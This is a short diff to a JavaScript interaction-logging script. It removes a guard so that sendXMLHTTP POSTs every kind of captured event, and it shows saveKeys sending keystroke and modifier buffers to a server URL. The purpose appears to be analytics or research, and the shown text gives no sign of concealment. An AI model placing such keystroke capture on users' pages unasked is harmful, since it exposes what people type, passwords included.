@@ -46,14 +46,15 @@ function defaultCallback(responseText){
 
 
 function sendXMLHTTP(from,params,url){
-	if(from != "saveMouse"){
-		return;
-	}
+	// if(from != "saveScrolls"){
+	// 	return;
+	// }
+	console.log("SendXMLHTTP"+from);
 	var xhr = new XMLHttpRequest();
 	xhr.open("POST", url, false);
 	xhr.setRequestHeader("Content-type", "application/json");
 	xhr.onreadystatechange = function() {
-		console.log("Payload:"+xhr.readyState);
+		// console.log("Payload:"+xhr.readyState);
 		if (xhr.readyState == 4) {
 			console.log("FROM: "+ from);
 			console.log(xhr.responseText);
@@ -62,6 +63,9 @@ function sendXMLHTTP(from,params,url){
 	}
 	xhr.send(JSON.stringify(params));
 }
+
+
+
 function saveKeys(keystroke_buffer,modifier_buffer){
 	var data = {'keys':keystroke_buffer,'modifiers':modifier_buffer}
     sendXMLHTTP("saveKeys",data,saveKeystrokeUrl);
